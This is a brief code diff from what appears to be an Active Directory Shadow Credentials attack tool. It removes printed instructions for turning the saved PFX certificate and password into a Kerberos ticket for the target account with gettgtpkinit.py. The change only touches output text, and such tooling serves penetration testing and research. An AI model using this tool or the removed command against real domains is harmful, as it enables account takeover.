@@ -420,9 +420,7 @@ class ShadowCredentialsADWS:
             
             print(f"[+] Saved PFX certificate: {pfx_file}")
             print(f"[+] PFX password: {pfx_password}")
-            print(f"\n[*] To obtain a TGT, run:")
-            print(f"    python3 gettgtpkinit.py -cert-pfx {pfx_file} -pfx-pass {pfx_password} {self.domain}/{self.target_samname} {filename}.ccache")
-        
+            
         return True
     
     def remove(self, device_id: str) -> bool:
